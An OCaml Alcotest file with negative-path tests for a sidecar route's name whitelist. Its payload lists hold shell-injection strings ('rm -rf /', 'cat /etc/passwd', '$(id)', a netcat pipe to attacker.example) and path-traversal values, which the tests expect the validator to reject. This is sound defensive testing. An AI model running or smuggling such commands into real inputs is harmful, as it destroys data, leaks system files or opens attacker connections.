(** Negative-path tests for /api/v1/sidecar/* routes.

    The HTTP layer is a thin wrapper around [validate_name] + a shell-out
    to the sidecar [run.sh]. The thing worth pinning is that any
    not-whitelisted [name=] short-circuits at [validate_name] BEFORE the
    code reaches [Sys.command] or [Process_eio.run_argv_with_status].

    Source of truth for endpoint design: docs/SIDECAR-LIFECYCLE-API-RFC.md.
*)

open Alcotest

module Routes = Masc_mcp.Server_routes_http_routes_sidecar

let result_of = function
  | Ok s -> "Ok " ^ s
  | Error e -> "Error " ^ e

let result_t = testable (Fmt.of_to_string result_of) ( = )

let validate name = Routes.validate_name name

(* ---- Happy path: every known sidecar id is accepted verbatim. ---- *)

let test_validate_accepts_each_known_id () =
  List.iter (fun id ->
    check result_t (Printf.sprintf "id %s is accepted" id) (Ok id) (validate (Some id))
  ) Routes.known_ids

(* ---- Whitelist enforcement. ---- *)

let test_validate_rejects_none () =
  check result_t "missing name → error"
    (Error "missing 'name' query parameter")
    (validate None)

let test_validate_rejects_unknown_id () =
  check result_t "wholly unknown id rejected"
    (Error "unknown sidecar id: facebook")
    (validate (Some "facebook"))

(* ---- Injection attempts: the only thing that matters is that an attacker-
       controlled string never falls through to Sys.command. The error message
       carries the raw input back, but the Result is Error, so handle_start /
       handle_stop short-circuit before any subprocess. ---- *)

let test_validate_rejects_shell_meta () =
  let payloads = [
    "discord;rm -rf /";
    "discord && cat /etc/passwd";
    "discord$(id)";
    "discord`whoami`";
    "discord|nc attacker.example 4444";
    "discord\nimessage";
  ] in
  List.iter (fun p ->
    match validate (Some p) with
    | Ok _ -> failf "shell-meta payload %S unexpectedly accepted" p
    | Error _ -> ()
  ) payloads

let test_validate_rejects_path_traversal () =
  let payloads = [
    "../../etc/passwd";
    "discord/../slack";
    "./discord";
    "/discord";
    "";
    "   ";
  ] in
  List.iter (fun p ->
    match validate (Some p) with
    | Ok _ -> failf "path-traversal payload %S unexpectedly accepted" p
    | Error _ -> ()
  ) payloads

(* ---- Whitelist size invariant. The dashboard mirrors this list as
       KNOWN_CONNECTOR_IDS in connector-status.ts; if a fifth bridge is
       added without updating both, the dashboard will draw a card the
       backend refuses to spawn. ---- *)

let test_known_ids_size_matches_dashboard () =
  check int "exactly 4 known sidecars (matches dashboard KNOWN_CONNECTOR_IDS)"
    4 (List.length Routes.known_ids)

let () =
  run "sidecar_lifecycle_routes"
    [
      ( "validate_name",
        [
          test_case "accepts every known id" `Quick test_validate_accepts_each_known_id;
          test_case "rejects None"           `Quick test_validate_rejects_none;
          test_case "rejects unknown id"     `Quick test_validate_rejects_unknown_id;
          test_case "rejects shell meta"     `Quick test_validate_rejects_shell_meta;
          test_case "rejects path traversal" `Quick test_validate_rejects_path_traversal;
        ] );
      ( "invariants",
        [
          test_case "known_ids size = 4" `Quick test_known_ids_size_matches_dashboard;
        ] );
    ]
